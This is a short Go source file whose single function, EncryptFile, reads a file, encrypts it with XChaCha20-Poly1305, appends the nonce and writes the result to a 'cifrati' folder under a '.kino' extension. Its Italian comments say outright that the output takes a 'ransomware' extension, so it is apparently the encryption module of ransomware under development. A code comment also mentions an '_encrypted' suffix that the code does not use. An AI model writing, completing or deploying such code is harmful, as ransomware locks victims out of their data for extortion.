package enc

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"os"

	"golang.org/x/crypto/chacha20poly1305"
)

func EncryptFile(path string, name string, key []byte) error {
	// TODO
	// - 1 leggere il file
	// - 2 cifrarlo con un nonce differente
	// - 3 crea la cartella se non esiste
	// - 4 salvare il file cifrato con il nome + estensione ransomware
	// 	   e aggiunta il nonce alla fine del file
	// note: utilizziamo xchacha20poly1305
	f, err := os.Open(path)
	if err != nil {
		log.Fatal(err)
		return err
	}

	fmt.Println(f, "encrypt	file")
	plainText, err := io.ReadAll(f)
	if err != nil {
		return err
	}

	nonce := make([]byte, chacha20poly1305.NonceSizeX)
	if _, err := rand.Read(nonce); err != nil {
		log.Fatal(err)
		return err
	}

	// mostra nonce come stringa
	nonceStr := hex.EncodeToString(nonce)
	fmt.Println("Nonce:", nonceStr)

	// crea la cartella se non esiste
	if _, err := os.Stat("./cifrati"); os.IsNotExist(err) {
		os.Mkdir("./cifrati", 0755)
	}

	cipher, err := chacha20poly1305.NewX(key)
	if err != nil {
		return err
	}

	// Encrypt the plaintext with the cipher
	ciphertext := cipher.Seal(nil, nonce, plainText, nil)

	// Append the nonce to the encrypted data
	encryptedData := append(ciphertext, nonce...)

	// Write the encrypted data to a new file with "_encrypted" suffix added to the original filename
	encryptedFilePath := "./cifrati/" + name + ".kino"
	if err := os.WriteFile(encryptedFilePath, encryptedData, 0644); err != nil {
		return err
	}

	return nil
}
